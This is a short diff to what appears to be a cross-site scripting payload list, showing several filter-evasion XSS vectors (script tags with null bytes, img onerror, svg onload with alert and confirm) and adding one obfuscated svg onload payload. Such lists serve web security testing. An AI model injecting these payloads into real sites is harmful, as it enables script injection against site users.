@@ -4,6 +4,8 @@
 "><\x00script>javascript:alert(1)</script>
 <--`<img/src=` onerror=confirm``> --!>
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+123<svg/onload=aler\u0074/**/`11`>456
+
 
 Tags to Trigger XSS Attacks:
 onclick
